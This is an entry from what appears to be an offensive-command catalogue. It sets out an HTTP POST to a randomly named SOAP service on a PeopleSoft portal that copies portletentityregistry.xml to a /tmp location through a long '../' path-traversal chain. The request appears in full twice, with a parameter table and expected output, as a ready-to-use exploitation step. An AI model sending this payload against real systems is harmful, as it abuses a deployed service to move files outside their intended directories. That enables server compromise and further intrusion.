---
data: >-
  POST /pspc/services/lmJyaVBUrfcEfJw HTTP/1.1

  <?xml version="1.0" encoding="utf-8"?>

  <soapenv:Envelope ...>

  <soapenv:Body>

  <api:copy ...>

  <in0
  xsi:type="xsd:string">./applications/peoplesoft/pspc.war/WEB-INF/data/portletentityregistry.xml</in0>

  <in1
  xsi:type="xsd:string">../../../../../../../../../../../../../../../../../../../../tmp/QAusGyxGqQqyVEhqzPbu/WEB-INF/data/portletentityregistry.xml</in1>

  </api:copy>

  </soapenv:Body>

  </soapenv:Envelope>
tags:
  - soap
  - file-copy
type: command
executor: bash
platforms:
  - Linux
  - Web
id: 06ad5936-4b46-4790-bfdd-324e207692b1
created_at: '2025-12-13T09:00:33.604Z'
updated_at: '2025-12-13T09:00:33.604Z'
verified: false
validated: true
submitted: true
---
# POST SOAP Copy to Temp

## Command

```bash
POST /pspc/services/lmJyaVBUrfcEfJw HTTP/1.1
<?xml version="1.0" encoding="utf-8"?>
<soapenv:Envelope ...>
<soapenv:Body>
<api:copy ...>
<in0 xsi:type="xsd:string">./applications/peoplesoft/pspc.war/WEB-INF/data/portletentityregistry.xml</in0>
<in1 xsi:type="xsd:string">../../../../../../../../../../../../../../../../../../../../tmp/QAusGyxGqQqyVEhqzPbu/WEB-INF/data/portletentityregistry.xml</in1>
</api:copy>
</soapenv:Body>
</soapenv:Envelope>
```

## Description

Copies XML file to temp directory using the deployed service.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `in0` | Source file path | Yes |
| `in1` | Destination path with traversal | Yes |

## Examples

### Basic Usage

```bash
POST /pspc/services/lmJyaVBUrfcEfJw HTTP/1.1
<?xml version="1.0" encoding="utf-8"?>
<soapenv:Envelope ...>
<soapenv:Body>
<api:copy ...>
<in0 xsi:type="xsd:string">./applications/peoplesoft/pspc.war/WEB-INF/data/portletentityregistry.xml</in0>
<in1 xsi:type="xsd:string">../../../../../../../../../../../../../../../../../../../../tmp/QAusGyxGqQqyVEhqzPbu/WEB-INF/data/portletentityregistry.xml</in1>
</api:copy>
</soapenv:Body>
</soapenv:Envelope>
```

## Expected Output

File copied successfully.

## Related

- [[procedures/Copy-XML-to-Temp-Directory]]
